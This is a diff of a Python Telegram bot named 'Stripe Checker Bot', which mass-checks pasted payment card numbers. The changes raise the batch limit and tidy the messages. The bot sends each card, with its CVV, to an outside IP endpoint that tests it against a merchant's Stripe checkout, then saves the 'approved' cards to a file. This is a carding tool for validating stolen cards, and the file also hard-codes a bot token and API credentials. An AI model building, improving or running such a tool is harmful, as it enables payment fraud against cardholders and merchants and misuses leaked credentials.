@@ -4,8 +4,8 @@ import aiohttp
 import aiofiles
 
 # ================== CONFIG ==================
-API_ID = 37235723          # Keep these (can be dummy)
-API_HASH = "880a876edaf529c8493b873d47821ec2"  # Keep these
+API_ID = 37235723
+API_HASH = "880a876edaf529c8493b873d47821ec2"
 BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
 
 ADMIN_ID = [7077294261]
@@ -15,20 +15,21 @@ PREMIUM_FILE = "premium.json"
 BANNED_FILE = "banned_users.json"
 CC_FILE = "approved.txt"
 
-# ================== STRIPE CHECKER ==================
-async def check_stripe(card):
+# ================== STRIPE CHECKER (Updated) ==================
+async def check_stripe(card: str, site: str = "redbluechair.com"):
     try:
-        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site=redbluechair.com"
+        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site={site}"
         
         timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
                 if res.status != 200:
-                    return {"Response": "HTTP Error", "Status": "Declined"}
+                    return {"Response": f"HTTP Error {res.status}", "Status": "Declined"}
                 
                 data = await res.json()
                 response_text = data.get("Response", str(data))
                 
+                # Clean response if it's JSON inside
                 if isinstance(response_text, str) and response_text.startswith("{"):
                     try:
                         rj = json.loads(response_text)
@@ -39,9 +40,9 @@ async def check_stripe(card):
                 lower = str(response_text).lower()
                 status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                 
-                return {"Response": str(response_text)[:250], "Status": status}
+                return {"Response": str(response_text)[:300], "Status": status}
     except Exception as e:
-        return {"Response": f"Error: {str(e)[:80]}", "Status": "Declined"}
+        return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined"}
 
 
 # ================== UTILITIES ==================
@@ -51,7 +52,8 @@ async def load_json(filename):
             async with aiofiles.open(filename, "w") as f:
                 await f.write(json.dumps({}))
         async with aiofiles.open(filename, "r") as f:
-            return json.loads(await f.read())
+            content = await f.read()
+            return json.loads(content) if content.strip() else {}
     except:
         return {}
 
@@ -61,9 +63,13 @@ async def save_json(filename, data):
 
 async def is_premium_user(user_id):
     data = await load_json(PREMIUM_FILE)
-    if str(user_id) not in data: return False
-    expiry = datetime.datetime.fromisoformat(data[str(user_id)]['expiry'])
-    return datetime.datetime.now() <= expiry
+    if str(user_id) not in data:
+        return False
+    try:
+        expiry = datetime.datetime.fromisoformat(data[str(user_id)]['expiry'])
+        return datetime.datetime.now() <= expiry
+    except:
+        return False
 
 async def is_banned_user(user_id):
     data = await load_json(BANNED_FILE)
@@ -81,7 +87,7 @@ client = TelegramClient('stripe_bot', API_ID, API_HASH)
 async def start(event):
     if await is_banned_user(event.sender_id):
         return await event.reply("🚫 You are banned!")
-    await event.reply("**🔥 Stripe Checker Bot**\nUse /mst to check cards")
+    await event.reply("**🔥 Stripe Checker Bot**\nUse `/mst` to check cards\nExample: `/mst 5443170628782539|06|30|222`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
 async def mst(event):
@@ -91,48 +97,55 @@ async def mst(event):
     if event.is_private and not await is_premium_user(event.sender_id):
         return await event.reply("Premium required in PM.")
 
-    text = (await event.get_reply_message()).text if event.reply_to_msg_id else event.raw_text
+    # Get text from reply or message
+    if event.reply_to_msg_id:
+        reply_msg = await event.get_reply_message()
+        text = reply_msg.text
+    else:
+        text = event.raw_text
+
     cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
     
     if not cards:
-        return await event.reply("No valid cards found!")
+        return await event.reply("❌ No valid cards found!\nFormat: `5443170628782539|06|30|222`")
 
-    cards = cards[:80]
+    cards = cards[:100]  # Increased limit a bit
     asyncio.create_task(process_mass(event, cards))
 
 
 async def process_mass(event, cards):
     total = len(cards)
     checked = approved = 0
-    status_msg = await event.reply(f"🔥 Checking {total} cards...")
+    status_msg = await event.reply(f"🔥 Checking **{total}** cards...")
 
-    for i in range(0, len(cards), 8):
+    for i in range(0, len(cards), 8):  # Batch of 8
         batch = cards[i:i+8]
         tasks = [check_stripe(card) for card in batch]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         for card, res in zip(batch, results):
             if isinstance(res, Exception):
-                res = {"Response": "Error", "Status": "Declined"}
+                res = {"Response": "Timeout/Error", "Status": "Declined"}
             
             checked += 1
             if res.get("Status") == "Approved":
                 approved += 1
                 await save_approved(card, res.get("Response"))
-                await event.reply(f"💎 **APPROVED**\n`{card}`\n{res.get('Response')}")
+                await event.reply(f"💎 **APPROVED**\n`{card}`\n**Response:** {res.get('Response')}")
 
             try:
-                await status_msg.edit(f"**Progress**\nApproved: {approved}\nChecked: {checked}/{total}")
+                await status_msg.edit(f"**Progress**\n✅ Approved: **{approved}**\n🔄 Checked: **{checked}/{total}**")
             except:
                 pass
-            await asyncio.sleep(1.1)
 
-    await status_msg.edit(f"✅ Done!\nApproved: {approved}/{total}")
+            await asyncio.sleep(1.2)  # Slight delay
+
+    await status_msg.edit(f"✅ **Finished!**\nApproved: **{approved}/{total}**")
 
 
 # ================== RUN ==================
 async def main():
-    print("🚀 Stripe Bot Started | Site: redbluechair.com")
+    print("🚀 Stripe Bot Started | API: 138.128.240.15:8009 | Site: redbluechair.com")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
